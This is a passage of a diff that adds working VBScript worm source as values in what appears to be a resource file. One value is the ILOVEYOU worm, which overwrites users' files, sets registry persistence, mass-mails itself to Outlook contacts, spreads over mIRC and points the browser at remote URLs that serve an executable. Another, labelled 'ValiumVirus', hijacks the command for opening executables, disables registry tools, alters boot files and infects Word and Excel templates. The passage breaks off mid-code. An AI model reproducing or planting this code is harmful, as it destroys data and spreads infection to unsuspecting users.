+ Set c = fso.GetFile(WScript.ScriptFullName) 
+ c.Copy(dirsystem&amp;"\MSKernel32.vbs") 
+ c.Copy(dirwin&amp;"\Win32DLL.vbs") 
+ c.Copy(dirsystem&amp;"\LOVE-LETTER-FOR-YOU.TXT.vbs") 
+ regruns() 
+ html() 
+ spreadtoemail() 
+ listadriv() 
+ end sub 
+ sub regruns() 
+ On Error Resume Next 
+ Dim num,downread 
+ regcreate 
+ "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKern el32",dirsystem&amp;"\MSKernel32.vbs" 
+ regcreate 
+ "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService s\Win32DLL",dirwin&amp;"\Win32DLL.vbs" 
+ downread="" 
+ downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory") 
+ if (downread="") then 
+ downread="c:\" 
+ end if 
+ if (fileexist(dirsystem&amp;"\WinFAT32.exe")=1) then 
+ Randomize 
+ num = Int((4 * Rnd) + 1) 
+ if num = 1 then 
+ regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
+ Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfm 
+ hPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe" 
+ elseif num = 2 then 
+ regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqw 
+ erWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe" 
+ elseif num = 3 then 
+ regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
+ Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBd 
+ QZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe" 
+ elseif num = 4 then 
+ regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
+ Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSD 
+ GjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN -BUGSFIX.exe" 
+ end if 
+ end if 
+ if (fileexist(downread&amp;"\WIN-BUGSFIX.exe")=0) then regcreate 
+ "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BU GSFIX",downread&amp;"\WIN-BUGSFIX.exe" 
+ regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet 
+ Explorer\Main\Start Page","about:blank" 
+ end if 
+ end sub 
+ sub listadriv 
+ On Error Resume Next 
+ Dim d,dc,s 
+ Set dc = fso.Drives 
+ For Each d in dc 
+ If d.DriveType = 2 or d.DriveType=3 Then 
+ folderlist(d.path&amp;"\") 
+ end if 
+ Next 
+ listadriv = s 
+ end sub 
+ sub infectfiles(folderspec) 
+ On Error Resume Next 
+ dim f,f1,fc,ext,ap,mircfname,s,bname,mp3 
+ set f = fso.GetFolder(folderspec) 
+ set fc = f.Files 
+ for each f1 in fc 
+ ext=fso.GetExtensionName(f1.path) 
+ ext=lcase(ext) 
+ s=lcase(f1.name) 
+ if (ext="vbs") or (ext="vbe") then 
+ set ap=fso.OpenTextFile(f1.path,2,true) 
+ ap.write vbscopy 
+ ap.close 
+ elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then 
+ set ap=fso.OpenTextFile(f1.path,2,true) 
+ ap.write vbscopy 
+ ap.close 
+ bname=fso.GetBaseName(f1.path) 
+ set cop=fso.GetFile(f1.path) 
+ cop.copy(folderspec&amp;"\"&amp;bname&amp;".vbs") fso.DeleteFile(f1.path) 
+ elseif(ext="jpg") or (ext="jpeg") then 
+ set ap=fso.OpenTextFile(f1.path,2,true) 
+ ap.write vbscopy 
+ ap.close 
+ set cop=fso.GetFile(f1.path) 
+ cop.copy(f1.path&amp;".vbs") 
+ fso.DeleteFile(f1.path) 
+ elseif(ext="mp3") or (ext="mp2") then 
+ set mp3=fso.CreateTextFile(f1.path&amp;".vbs") 
+ mp3.write vbscopy 
+ mp3.close 
+ set att=fso.GetFile(f1.path) 
+ att.attributes=att.attributes+2 
+ end if 
+ if (eq&lt;&gt;folderspec) then 
+ if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then 
+ set scriptini=fso.CreateTextFile(folderspec&amp;"\script.ini") scriptini.WriteLine "[script]" 
+ scriptini.WriteLine ";mIRC Script" 
+ scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will" 
+ scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks" 
+ scriptini.WriteLine ";" 
+ scriptini.WriteLine ";Khaled Mardam-Bey" 
+ scriptini.WriteLine ";http://www.mirc.com" 
+ scriptini.WriteLine ";" 
+ scriptini.WriteLine "n0=on 1:JOIN:#:{" 
+ scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }" scriptini.WriteLine "n2=  /.dcc send $nick 
+ "&amp;dirsystem&amp;"\LOVE-LETTER-FOR-YOU.HTM" 
+ scriptini.WriteLine "n3=}" 
+ scriptini.close 
+ eq=folderspec 
+ end if 
+ end if 
+ next 
+ end sub 
+ sub folderlist(folderspec) 
+ On Error Resume Next 
+ dim f,f1,sf 
+ set f = fso.GetFolder(folderspec) 
+ set sf = f.SubFolders 
+ for each f1 in sf 
+ infectfiles(f1.path) 
+ folderlist(f1.path) 
+ next 
+ end sub 
+ sub regcreate(regkey,regvalue) 
+ Set regedit = CreateObject("WScript.Shell") 
+ regedit.RegWrite regkey,regvalue 
+ end sub 
+ function regget(value) 
+ Set regedit = CreateObject("WScript.Shell") 
+ regget=regedit.RegRead(value) 
+ end function 
+ function fileexist(filespec) 
+ On Error Resume Next 
+ dim msg 
+ if (fso.FileExists(filespec)) Then 
+ msg = 0 
+ else 
+ msg = 1 
+ end if 
+ fileexist = msg 
+ end function 
+ function folderexist(folderspec) 
+ On Error Resume Next 
+ dim msg 
+ if (fso.GetFolderExists(folderspec)) then 
+ msg = 0 
+ else 
+ msg = 1 
+ end if 
+ fileexist = msg 
+ end function 
+ sub spreadtoemail() 
+ On Error Resume Next 
+ dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad 
+ set regedit=CreateObject("WScript.Shell") 
+ set out=WScript.CreateObject("Outlook.Application") 
+ set mapi=out.GetNameSpace("MAPI") 
+ for ctrlists=1 to mapi.AddressLists.Count 
+ set a=mapi.AddressLists(ctrlists) 
+ x=1 
+ regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&amp;a) if (regv="") then 
+ regv=1 
+ end if 
+ if (int(a.AddressEntries.Count)&gt;int(regv)) then 
+ for ctrentries=1 to a.AddressEntries.Count 
+ malead=a.AddressEntries(x) 
+ regad="" 
+ regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&amp;malead ) 
+ if (regad="") then 
+ set male=out.CreateItem(0) 
+ male.Recipients.Add(malead) 
+ male.Subject = "ILOVEYOU" 
+ male.Body = vbcrlf&amp;"kindly check the attached LOVELETTER coming from me." 
+ male.Attachments.Add(dirsystem&amp;"\LOVE-LETTER-FOR-YOU.TXT.vbs") male.Send 
+ regedit.RegWrite 
+ "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&amp;malead,1,"REG_DWORD" end if 
+ x=x+1 
+ next 
+ regedit.RegWrite 
+ "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&amp;a,a.AddressEntries.Count else 
+ regedit.RegWrite 
+ "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&amp;a,a.AddressEntries.Count end if 
+ next 
+ Set out=Nothing 
+ Set mapi=Nothing 
+ end sub 
+ sub html 
+ On Error Resume Next 
+ dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6 
+ dta1="&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;LOVELETTER - HTML&lt;?-?TITLE&gt;&lt;META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - 
+ LOVELETTER@-@&gt;"&amp;vbcrlf&amp; _ "&lt;META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? 
+ @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@&gt;"&amp;vbcrlf&amp; _ "&lt;META NAME=@-@Description@-@ 
+ CONTENT=@-@simple but i think this is good...@-@&gt;"&amp;vbcrlf&amp; _ 
+ "&lt;?-?HEAD&gt;&lt;BODY 
+ ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU. 
+ HTM#-#,#-#main#-#)@-@ "&amp;vbcrlf&amp; _ 
+ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU. HTM#-#,#-#main#-#)@-@ 
+ BGPROPERTIES=@-@fixed@-@ 
+ BGCOLOR=@-@#FF9933@-@&gt;"&amp;vbcrlf&amp; _ 
+ "&lt;CENTER&gt;&lt;p&gt;This HTML file need ActiveX Control&lt;?-?p&gt;&lt;p&gt;To Enable to read this HTML file&lt;BR&gt;- Please press #-#YES#-# button to 
+ Enable ActiveX&lt;?-?p&gt;"&amp;vbcrlf&amp; _ 
+ "&lt;?-?CENTER&gt;&lt;MARQUEE LOOP=@-@infinite@-@ 
+ BGCOLOR=@-@yellow@-@&gt;----------z--------------------z----------&lt;?-?MARQU EE&gt; "&amp;vbcrlf&amp; _ 
+ "&lt;?-?BODY&gt;&lt;?-?HTML&gt;"&amp;vbcrlf&amp; _ 
+ "&lt;SCRIPT language=@-@JScript@-@&gt;"&amp;vbcrlf&amp; _ "&lt;!--?-??-?"&amp;vbcrlf&amp; _ 
+ "if (window.screen){var wi=screen.availWidth;var 
+ hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&amp;vbcrl f&amp; _ 
+ "?-??-?--&gt;"&amp;vbcrlf&amp; _ 
+ "&lt;?-?SCRIPT&gt;"&amp;vbcrlf&amp; _ 
+ "&lt;SCRIPT LANGUAGE=@-@VBScript@-@&gt;"&amp;vbcrlf&amp; _ "&lt;!--"&amp;vbcrlf&amp; _ 
+ "on error resume next"&amp;vbcrlf&amp; _ 
+ "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&amp;vbcrlf&amp; _ "aw=1"&amp;vbcrlf&amp; _ 
+ "code=" 
+ dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&amp;vbcrlf&amp; _ 
+ "set dirsystem=fso.GetSpecialFolder(1)"&amp;vbcrlf&amp; _ "code2=replace(code,chr(91)&amp;chr(45)&amp;chr(91),chr(39))"&amp;vbcrlf&amp; _ 
+ "code3=replace(code2,chr(93)&amp;chr(45)&amp;chr(93),chr(34))"&amp;vbcrlf&amp; _ "code4=replace(code3,chr(37)&amp;chr(45)&amp;chr(37),chr(92))"&amp;vbcrlf&amp; _ "set 
+ wri=fso.CreateTextFile(dirsystem&amp;@-@^-^MSKernel32.vbs@-@)"&amp;vbcrlf&amp; _ 
+ "wri.write code4"&amp;vbcrlf&amp; _ 
+ "wri.close"&amp;vbcrlf&amp; _ 
+ "if (fso.FileExists(dirsystem&amp;@-@^-^MSKernel32.vbs@-@)) then"&amp;vbcrlf&amp; _ "if (err.number=424) then"&amp;vbcrlf&amp; _ 
+ "aw=0"&amp;vbcrlf&amp; _ 
+ "end if"&amp;vbcrlf&amp; _ 
+ "if (aw=1) then"&amp;vbcrlf&amp; _ 
+ "document.write @-@ERROR: can#-#t initialize ActiveX@-@"&amp;vbcrlf&amp; _ "window.close"&amp;vbcrlf&amp; _ 
+ "end if"&amp;vbcrlf&amp; _ 
+ "end if"&amp;vbcrlf&amp; _ 
+ "Set regedit = CreateObject(@-@WScript.Shell@-@)"&amp;vbcrlf&amp; _ 
+ "regedit.RegWrite 
+ @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^ 
+ -^Run^-^MSKernel32@-@,dirsystem&amp;@-@^-^MSKernel32.vbs@-@"&amp;vbcrlf&amp; _ "?-??-?--&gt;"&amp;vbcrlf&amp; _ 
+ "&lt;?-?SCRIPT&gt;" 
+ dt1=replace(dta1,chr(35)&amp;chr(45)&amp;chr(35),"'") 
+ dt1=replace(dt1,chr(64)&amp;chr(45)&amp;chr(64),"""") dt4=replace(dt1,chr(63)&amp;chr(45)&amp;chr(63),"/") 
+ dt5=replace(dt4,chr(94)&amp;chr(45)&amp;chr(94),"\") 
+ dt2=replace(dta2,chr(35)&amp;chr(45)&amp;chr(35),"'") 
+ dt2=replace(dt2,chr(64)&amp;chr(45)&amp;chr(64),"""") dt3=replace(dt2,chr(63)&amp;chr(45)&amp;chr(63),"/") 
+ dt6=replace(dt3,chr(94)&amp;chr(45)&amp;chr(94),"\") 
+ set fso=CreateObject("Scripting.FileSystemObject") 
+ set c=fso.OpenTextFile(WScript.ScriptFullName,1) 
+ lines=Split(c.ReadAll,vbcrlf) 
+ l1=ubound(lines) 
+ for n=0 to ubound(lines) 
+ lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91)) lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93)) 
+ lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37)) if (l1=n) then 
+ lines(n)=chr(34)+lines(n)+chr(34) 
+ else 
+ lines(n)=chr(34)+lines(n)+chr(34)&amp;"&amp;vbcrlf&amp; _" end if 
+ next 
+ set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM") b.close 
+ set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2) d.write dt5 
+ d.write join(lines,vbcrlf) 
+ d.write vbcrlf 
+ d.write dt6 
+ d.close 
+ end sub</value>
+  </data>
+  <data name="ValiumVirus" xml:space="preserve">
+    <value>Randomize
+on error resume next
+r = int(rnd * 100)
+If r = 7 then
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	set a = fso.CreateTextFile("C:\windows\system\Oeminfo.ini")
+	a.writeline "[General]"
+	a.writeline "Manufacturer=" &amp; chr(34) &amp; "Psychologic" &amp; chr(34)
+	a.writeline "Model=" &amp; chr(34) &amp; "Valium virus" &amp; chr(34)
+	a.writeline "[Support Information]"
+	a.writeline "Line1 = " &amp; chr(34) &amp; "Your computer has been infected with valium virus" &amp; chr(34)
+	a.writeline "Line2 = " &amp; chr(34) &amp; "" &amp; chr(34)
+	a.writeline "Line3 = " &amp; chr(34) &amp; "'valium by Psychologic" &amp; chr(34)
+	set payload = fso.createtextfile("C:\payload.html",true)
+	payload.writeline "&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Valium virus&lt;/TITLE&gt;&lt;SCRIPT LANGUAGE=" &amp; chr(34) &amp; "JavaScript" &amp; chr(34) &amp; "&gt;"
+	payload.writeline "&lt;!-- Begin"
+	payload.writeline "var matrix_window;"
+	payload.writeline "function MatrixWrite(string, bold, italic, speed) {"
+	payload.writeline "var height = window.screen.height;"
+	payload.writeline "var width = window.screen.width;"
+	payload.writeline "var win_dimensions = " &amp; chr(34) &amp; "height = " &amp; chr(34) &amp; " + eval(height + 10) + " &amp; chr(34) &amp; ", width = " &amp; chr(34) &amp; " + eval(width + 30);"
+	payload.writeline "matrix_window = window.open(" &amp; chr(34) &amp; "blank.htm" &amp; chr(34) &amp; ", " &amp; chr(34) &amp; "matrix_window" &amp; chr(34) &amp; ", win_dimensions);"
+	payload.writeline "matrix_window.document.open(" &amp; chr(34) &amp; "text/html" &amp; chr(34) &amp; ", " &amp; chr(34) &amp; "replace" &amp; chr(34) &amp; ");"
+	payload.writeline "var i;"
+	payload.writeline "var timer = 0;"
+	payload.writeline "if(matrix_window.moveTo)"
+	payload.writeline "matrix_window.moveTo(-10, -30);"
+	payload.writeline "if(matrix_window.resizeBy)"
+	payload.writeline "matrix_window.resizeBy(0, 50);"
+	payload.writeline "matrix_window.document.write(" &amp; chr(34) &amp; "&lt;body bgcolor=000000 text=00ff00 onBlur='self.focus()'&gt;" &amp; chr(34) &amp; ");"
+	payload.writeline "matrix_window.document.write(" &amp; chr(34) &amp; "&lt;font face=system&gt;" &amp; chr(34) &amp; ");"
+	payload.writeline "if(bold == true) matrix_window.document.write(" &amp; chr(34) &amp; "&lt;b&gt;" &amp; chr(34) &amp; ");"
+	payload.writeline "if(italic == true) matrix_window.document.write(" &amp; chr(34) &amp; "&lt;i&gt;" &amp; chr(34) &amp; ");"
+	payload.writeline "for(i = 0; i &lt;= string.length; i++) {"
+	payload.writeline "timer += (Math.random() * speed);"
+	payload.writeline "setTimeout(" &amp; chr(34) &amp; "matrix_window.document.write('" &amp; chr(34) &amp; " + string.charAt(i) + " &amp; chr(34) &amp; "');" &amp; chr(34) &amp; ", timer);"
+	payload.writeline "}"
+	payload.writeline "timer += 2000;"
+	payload.writeline "setTimeout(" &amp; chr(34) &amp; "matrix_window.close()" &amp; chr(34) &amp; ", timer);"
+	payload.writeline "}"
+	payload.writeline "&lt;!-- JavaScript Praphical matRix payload By : Psyhologic --&gt;"
+	payload.writeline "&lt;!-- Email : psychologic@hotmail.com --&gt;"
+	payload.writeline "&lt;!-- Made From Microsoft Visual Basic Worm Editor By Psychologic --&gt;"
+	payload.writeline "&lt;!-- Begin"
+	payload.writeline "var matrix_window;"
+	payload.writeline "function MatrixWrite(string, bold, italic, speed) {"
+	payload.writeline "var height = window.screen.height;"
+	payload.writeline "var width = window.screen.width;"
+	payload.writeline "var win_dimensions = " &amp; chr(34) &amp; "height = " &amp; chr(34) &amp; " + eval(height + 10) + " &amp; chr(34) &amp; ", width = " &amp; chr(34) &amp; " + eval(width + 30);"
+	payload.writeline "matrix_window = window.open(" &amp; chr(34) &amp; "blank.htm" &amp; chr(34) &amp; ", " &amp; chr(34) &amp; "matrix_window" &amp; chr(34) &amp; ", win_dimensions);"
+	payload.writeline "matrix_window.document.open(" &amp; chr(34) &amp; "text/html" &amp; chr(34) &amp; ", " &amp; chr(34) &amp; "replace" &amp; chr(34) &amp; ");"
+	payload.writeline "var i;"
+	payload.writeline "var timer = 0;"
+	payload.writeline "if(matrix_window.moveTo)"
+	payload.writeline "matrix_window.moveTo(-10, -30);"
+	payload.writeline "if(matrix_window.resizeBy)"
+	payload.writeline "matrix_window.resizeBy(0, 50);"
+	payload.writeline "matrix_window.document.write(" &amp; chr(34) &amp; "&lt;body bgcolor=000000 text=00ff00 onBlur='self.focus()'&gt;" &amp; chr(34) &amp; ");"
+	payload.writeline "matrix_window.document.write(" &amp; chr(34) &amp; "&lt;font face=system&gt;" &amp; chr(34) &amp; ");"
+	payload.writeline "if(bold == true) matrix_window.document.write(" &amp; chr(34) &amp; "&lt;b&gt;" &amp; chr(34) &amp; ");"
+	payload.writeline "if(italic == true) matrix_window.document.write(" &amp; chr(34) &amp; "&lt;i&gt;" &amp; chr(34) &amp; ");"
+	payload.writeline "for(i = 0; i &lt;= string.length; i++) {"
+	payload.writeline "timer += (Math.random() * speed);"
+	payload.writeline "setTimeout(" &amp; chr(34) &amp; "matrix_window.document.write('" &amp; chr(34) &amp; " + string.charAt(i) + " &amp; chr(34) &amp; "');" &amp; chr(34) &amp; ", timer);"
+	payload.writeline "}"
+	payload.writeline "timer += 2000;"
+	payload.writeline "setTimeout(" &amp; chr(34) &amp; "matrix_window.close()" &amp; chr(34) &amp; ", timer);"
+	payload.writeline "}"
+	payload.writeline "var messages = new Array(" &amp; chr(34) &amp; "this is valium virus by puppy" &amp; chr(34) &amp; "," &amp; chr(34) &amp; "valium ----- youri had belong to me" &amp; chr(34) &amp; "," &amp; chr(34) &amp; "Please delete me now" &amp; chr(34) &amp; ");"
+	payload.writeline "function GetRndIndex() {"
+	payload.writeline "return (parseInt(Math.random() * messages.length));"
+	payload.writeline "}"
+	payload.writeline "function WriteRndMsg(bold, italic, speed) {"
+	payload.writeline "MatrixWrite(messages[GetRndIndex()], bold, italic, speed);"
+	payload.writeline "}"
+	payload.writeline "//  End --&gt;"
+	payload.writeline "function GetRndIndex() {"
+	payload.writeline "return (parseInt(Math.random() * messages.length));"
+	payload.writeline "}"
+	payload.writeline "function WriteRndMsg(bold, italic, speed) {"
+	payload.writeline "MatrixWrite(messages[GetRndIndex()], bold, italic, speed);"
+	payload.writeline "}"
+	payload.writeline "//  End --&gt;"
+	payload.writeline "&lt;/script&gt;"
+	payload.writeline "&lt;/HEAD&gt;"
+	payload.writeline "&lt;BODY Onload = " &amp; chr(34) &amp; "javascript:WriteRndMsg(true, true, 750)" &amp; chr(34) &amp; "&gt;"
+	payload.writeline "&lt;b&gt;Your Computer has been Infected with : &lt;/b&gt;"
+	payload.writeline "&lt;p&gt;&lt;b&gt;&lt;font color=" &amp; chr(34) &amp; "#FF0000" &amp; chr(34) &amp; "&gt;Valium virus &lt;/font&gt; Your Pc has been infected with Valium virus by psychologic/redline&lt;/b&gt;&lt;/p&gt;"
+	payload.writeline "&lt;/body&gt;&lt;/html&gt;"
+	payload.close
+	CreateObject("Wscript.shell").run "C:\payload.html"
+end if
+
+CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
+createobject("Wscript.shell").regwrite "HKEY_CLASSES_ROOT\Directory\Shell\valium games\Command\","WScript.exe | C:\Windows\valium.vbs"
+createobject("Wscript.shell").regwrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\", "%WINDIR%\valium.vbs %1 %*"
+set executor = wscript.CreateObject("WScript.Shell")
+Set fso = createobject("scripting.filesystemobject")
+fso.CopyFile Wscript.ScriptFullName, "C:\windows\valium.vbs"
+fso.CopyFile Wscript.ScriptFullName, "C:\windows\systemCD.vbs"
+fso.copyfile wscript.scriptfullname,"C:\windows\WindowsSystem.sys"
+Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1, True)
+code = OpenSelf.readall &amp; vbcrlf &amp; "'valium"
+set backup = fso.createtextfile("C:\doc.1",true)
+backup.write code
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'A function to changes this script body to *cpp format,need to drop file for buffy character
+'and all formated *cpp character saved in one variable
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+set opendropercpp = fso.OpenTextFile("C:\windows\WindowsSystem.sys", 1)
+allsourcecpp = ""
+oneline1 = ""
+do while opendropercpp.readline &lt;&gt; "'valium"
+oneline1 = ""
+oneline1 = opendropercpp.readline
+onebyone = len(oneline1)
+for i = 1 to onebyone
+read34 = mid(oneline1,i,1)
+if read34 = chr(34) then
+m = ",34"
+else
+m = ""
+end if
+all = all &amp; m
+next
+cppformat = replace(oneline1,chr(34),"%c")
+fullline1 = "fprintf(mvbswe," &amp; chr(34) &amp; cppformat &amp; "\n" &amp; chr(34) &amp; all &amp; ");"
+allsourcecpp = allsourcecpp &amp; vbcrlf &amp;  fullline1
+all = ""
+loop
+opendropercpp.close
+
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'A function to changes this script body to *frm format,need to drop file for buffy character
+'and all formated *frm character saved in one variable
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+set opendroperfrm = fso.OpenTextFile("C:\windows\WindowsSystem.sys", 1)
+allsourcefrm = ""
+oneline = ""
+do while opendroperfrm.readline &lt;&gt; "'valium"
+  oneline = opendroperfrm.readline
+  frmformat = replace(oneline,chr(34),chr(34)&amp;"&amp;chr(34)&amp;"&amp;chr(34))
+  fullline = "? #1," &amp; frmformat
+  allsourcefrm = allsourcefrm &amp; vbcrlf &amp; fullline
+loop
+opendroperfrm.close
+
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'A function to changes this script body to *pas format,need to drop file for buffy character
+'and all formated *pas character saved in one variable
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+oneline2 = ""
+set opendroperpas = fso.OpenTextFile("C:\windows\WindowsSystem.sys", 1)
+do while opendroperpas.readline &lt;&gt; "'valium"
+  oneline2 = ""
+  oneline2 = opendroperpas.readline
+  fullline2 = "writeln (mvbswe,'" &amp; oneline2 &amp; "');"
+  allsourcepas = allsourcepas &amp; vbcrlf &amp; fullline2
+loop
+opendroperpas.close
+
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Just for spliting a:,its a funny stuff,but not destructive
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+set r = fso.opentextfile("C:\autoexec.bat",1)
+all = r.readall
+set m = fso.createtextfile("C:\autoexec.bat",true)
+m.write all
+m.writeline "subst c: a:\"
+m.writeline "subst d: a:\"
+m.writeline "subst e: a:\"
+m.writeline "subst f: a:\"
+m.writeline "subst g: a:\"
+m.close
+
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Also funny stuff,valium will make boot.ini in C:\
+'infected machine will now about this
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+set boot = fso.createtextfile("C:\boot.ini",true)
+boot.writeline "[Boot Loader]"
+boot.writeline "timeout=60"
+boot.writeline "Default=C:\"
+boot.writeline ""
+boot.writeline "[Operating Systems]"
+boot.writeline "C:\" &amp; chr(34) &amp; "You infected with valium virus" &amp; chr(34) &amp; " /fastdetect"
+boot.writeline "D:\" &amp; chr(34) &amp; "Psychologic was here" &amp; chr(34)
+boot.writeline "E:\" &amp; chr(34) &amp; "This is valium New operating system" &amp; chr(34)
+boot.close
+
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'A function to changes this script body to macro's format,it is needed for injecting the virus
+'body to Normaltemp,you see,after this execution,valium will be macro virus too.
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+set opendroperdoc = fso.OpenTextFile("C:\doc.1", 1)
+set doc= fso.CreateTextFile("C:\Document.sys", 1)
+doc.writeline "Private Sub Document_Open()"&amp;vbcrlf&amp;"Open "&amp;chr(34)&amp;"file.vbs"&amp;chr(34)&amp;" for output as #1"
+do while oneline &lt;&gt; "'valium"
+  	oneline = opendroperdoc.readline
+  	docformat = replace(oneline,chr(34),chr(34)&amp;"&amp;chr(34)&amp;"&amp;chr(34))
+  	fullline = "? #1," &amp; Chr(34) &amp; docformat &amp; chr(34)
+	doc.writeline fullline
+loop
+doc.writeline vbcrlf &amp; "close #1 : Createobject("&amp; chr(34) &amp; "Wscrip.shell" &amp; chr(34) &amp; ").run " &amp; chr(34) &amp; "file.vbs" &amp; chr(34) &amp; " : end sub"
+doc.close
+opendroperdoc.close
+
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Infecting NormalTemp
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Set wordobj = CreateObject("Word.Application")
+Set NT = wordobj.NormalTemplate.VBProject.VBComponents
+For h = 1 To NT.Count
+If NT(h).Name = "valy" Then
+	wordobj.NormalTemplate.Save
+	wordobj.Quit
+	wordobj = ""
+else
+NT.Import "C:\Document.sys"
+end if
+next
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+'Infecting XLStert
+'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Set excelvir = CreateObject("excel.application")
+excelvir.Visible = (Rnd * 0)
+excelvir.CommandBars("Tools").Controls(10).Enabled = 0
+excelvir.CommandBars("Tools").Controls(12).Enabled = 0
+excelvir.CommandBars("View").Controls(3).Enabled = 0
+excelvir.CommandBars("Window").Controls(3).Enabled = 0
+excelvir.CommandBars("Window").Controls(4).Enabled = 0
